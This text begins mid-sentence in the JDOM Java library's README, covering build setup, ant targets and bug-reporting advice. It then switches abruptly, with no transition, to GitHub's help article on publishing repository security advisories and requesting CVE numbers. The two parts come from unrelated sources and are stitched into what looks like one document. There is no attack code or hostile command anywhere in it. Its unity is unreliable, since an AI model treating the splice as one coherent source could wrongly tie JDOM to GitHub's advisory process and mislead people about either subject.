"${name}-${version}.zip". The 'official' JDOM Build process is done by
creating a file 'build.properties' in the 'top' folder of the JDOM code, and
it contains the single line (or whatever the appropriate version is):

```
version=2.0.0

```

If your favourite Java IDE happens to be Eclipse, you can run the 'eclipse' ant
target, and that will configure your Eclipse project to have all the right
'source' folders, and 'Referenced Libraries'. After running the 'ant eclipse'
target, you should refresh your Eclipse project, and you should have a project
with no errors or warnings.

# Build targets

The build system is not only responsible for compiling JDOM into a jar file,
but is also responsible for creating the HTML documentation in the form of
javadocs.

These are the meaningful targets for this build file:

* package [default] -> generates ./build/package/jdom\*.zip
* compile -> compiles the source code
* javadoc -> generates the API documentation in ./build/javadocs
* junit -> runs the JUnit tests
* coverage -> generates test coverage metrics
* eclipse -> generates an Eclipse project (source folders, jars, etc)
* clean -> restores the distribution to its original and clean state
* maven -> generates the package, and makes a 'bundle' for maven-central

To learn the details of what each target does, read the build.xml file. It is
quite understandable.

# Bug Reports

Bug reports go to the jdom-interest list at jdom.org. But *BEFORE YOU POST*
make sure you've tested against the LATEST code available from GitHub (or the
daily snapshot). Odds are good your bug has already been fixed. If it hasn't
been fixed in the latest version, then when posting *BE SURE TO SAY* which
code version you tested against. For example, "GitHub from October 3rd". Also
be sure to include enough information to reproduce the bug and full exception
stack traces. You might also want to read the FAQ at <http://jdom.org> to find
out if your problem is not really a bug and just a common misunderstanding
about how XML or JDOM works.

# Searching for Information

The JDOM mailing lists are archived and easily searched at
<http://jdom.markmail.org>.

# Publishing a repository security advisory

You can publish a security advisory to alert your community about a security vulnerability in your project.

## In this article

* [Prerequisites](#prerequisites)
* [About publishing a security advisory](#about-publishing-a-security-advisory)
* [Publishing a security advisory](#publishing-a-security-advisory)
* [Dependabot alerts for published security advisories](#dependabot-alerts-for-published-security-advisories)
* [Requesting a CVE identification number (Optional)](#requesting-a-cve-identification-number-optional)
* [Further reading](#further-reading)

Anyone with admin permissions to a security advisory can publish the security advisory.

Note

This article applies to editing repository-level advisories as an owner of a public repository.

Users who are not repository owners can contribute to global security advisories in the GitHub Advisory Database at [github.com/advisories](https://github.com/advisories). Edits to global advisories will not change or affect how the advisory appears on the repository. For more information, see [Editing security advisories in the GitHub Advisory Database](/en/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/editing-security-advisories-in-the-github-advisory-database).

## [Prerequisites](#prerequisites)

Before you can publish a security advisory or request a CVE identification number, you must create a draft security advisory and provide information about the versions of your project affected by the security vulnerability. For more information, see [Creating a repository security advisory](/en/code-security/security-advisories/working-with-repository-security-advisories/creating-a-repository-security-advisory).

If you've created a security advisory but haven't yet provided details about the versions of your project that the security vulnerability affects, you can edit the security advisory. For more information, see [Editing a repository security advisory](/en/code-security/security-advisories/working-with-repository-security-advisories/editing-a-repository-security-advisory).

## [About publishing a security advisory](#about-publishing-a-security-advisory)

When you publish a security advisory, you notify your community about the security vulnerability that the security advisory addresses. Publishing a security advisory makes it easier for your community to update package dependencies and research the impact of the security vulnerability.

You can also use repository security advisories to republish the details of a security vulnerability that you have already disclosed elsewhere by copying and pasting the details of the vulnerability into a new security advisory.

Before you publish a security advisory, you can privately collaborate to fix the vulnerability in a temporary private fork. For more information, see [Collaborating in a temporary private fork to resolve a repository security vulnerability](/en/code-security/security-advisories/working-with-repository-security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-repository-security-vulnerability).

Warning

Whenever possible, you should always add a fix version to a security advisory prior to publishing the advisory. If you don't, the advisory will be published without a fixed version, and Dependabot will alert your users about the issue, without offering any safe version to update to.

We recommend you take the following steps in these different situations:

* If a fix version is imminently available, and you are able to, wait to disclose the issue when the fix is ready.
* If a fix version is in development but not yet available, mention this in the advisory, and edit the advisory later, after publication.
* If you are not planning to fix the issue, be clear about it in the advisory so that your users don't contact you to ask when a fix will be made. In this case, it is helpful to include steps users can take to mitigate the issue.

When you publish a draft advisory from a public repository, everyone is able to see:

* The current version of the advisory data.
* Any advisory credits that the credited users have accepted.

Note

The general public will never have access to the edit history of the advisory, and will only see the published version.

After you publish a security advisory, the URL for the security advisory will remain the same as before you published the security advisory. Anyone with read access to the repository can see the security advisory. Collaborators on the security advisory can continue to view past conversations, including the full comment stream, in the security advisory unless someone with admin permissions removes the collaborator from the security advisory.

If you need to update or correct information in a security advisory that you've published, you can edit the security advisory. For more information, see [Editing a repository security advisory](/en/code-security/security-advisories/working-with-repository-security-advisories/editing-a-repository-security-advisory).

## [Publishing a security advisory](#publishing-a-security-advisory)

Publishing a security advisory deletes the temporary private fork for the security advisory.

1. On GitHub, navigate to the main page of the repository.
2. Under the repository name, click  **Security**. If you cannot see the "Security" tab, select the  dropdown menu, and then click **Security**.
   ![Screenshot of a repository header showing the tabs. The "Security" tab is highlighted by a dark orange outline.](/assets/cb-17801/images/help/repository/security-tab.png)
3. In the left sidebar, under "Reporting", click  **Advisories**.
4. In the "Security Advisories" list, click the name of the security advisory you'd like to publish.
5. Scroll to the bottom of the advisory form and click **Publish advisory**.

   ![Screenshot of the "Required advisory information has been provided" area of the page. The "Publish advisory" button is outlined in orange.](/assets/cb-56518/images/help/security/publish-advisory-button.png)

Note

If you selected "Request CVE ID later", you will see a **Request CVE** button in place of the **Publish advisory** button. For more information, see [Requesting a CVE identification number (Optional)](#requesting-a-cve-identification-number-optional) below.

## [Dependabot alerts for published security advisories](#dependabot-alerts-for-published-security-advisories)

GitHub will review each published security advisory, add it to the GitHub Advisory Database, and may use the security advisory to send Dependabot alerts to affected repositories. If the security advisory comes from a fork, we'll only send an alert if the fork owns a package, published under a unique name, on a public package registry. This process can take up to 72 hours and GitHub may contact you for more information.

For more information about Dependabot alerts, see [About Dependabot alerts](/en/code-security/dependabot/dependabot-alerts/about-dependabot-alerts#dependabot-alerts-for-vulnerable-dependencies) and [About Dependabot security updates](/en/code-security/dependabot/dependabot-security-updates/about-dependabot-security-updates#about-dependabot-security-updates). For more information about GitHub Advisory Database, see [Browsing security advisories in the GitHub Advisory Database](/en/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/browsing-security-advisories-in-the-github-advisory-database).

## [Requesting a CVE identification number (Optional)](#requesting-a-cve-identification-number-optional)

If you want a CVE identification number for the security vulnerability in your project, and don't already have one, you can request a CVE identification number from GitHub. GitHub usually reviews the request within 72 hours. Requesting a CVE identification number doesn't make your security advisory public. If your security advisory is eligible for a CVE, GitHub will reserve a CVE identification number for your advisory. We'll then publish the CVE details after you make your security advisory public. Anyone with admin permissions to a security advisory can request a CVE identification number.

If you already have a CVE you want to use, for example, if you use a CVE Numbering Authority (CNA) other than GitHub, add the CVE to the security advisory form. This may happen, for example, if you want to get the advisory consistent with other communications you plan to send out at publication time. GitHub cannot assign CVEs to your project if it is covered by another CNA. For more information, see [About repository security advisories](/en/code-security/security-advisories/working-with-repository-security-advisories/about-repository-security-advisories#cve-identification-numbers).

1. On GitHub, navigate to the main page of the repository.
2. Under the repository name, click  **Security**. If you cannot see the "Security" tab, select the  dropdown menu, and then click **Security**.
   ![Screenshot of a repository header showing the tabs. The "Security" tab is highlighted by a dark orange outline.](/assets/cb-17801/images/help/repository/security-tab.png)
3. In the left sidebar, under "Reporting", click  **Advisories**.
4. In the "Security Advisories" list, click the name of the security advisory you'd like to request a CVE identification number for.
5. Scroll to the bottom of the advisory form and click **Request CVE**.

   ![Screenshot of the "Required advisory information has been provided" area of the page. The "Request CVE" button is outlined in dark orange.](/assets/cb-55619/images/help/security/security-advisory-request-cve-button.png)
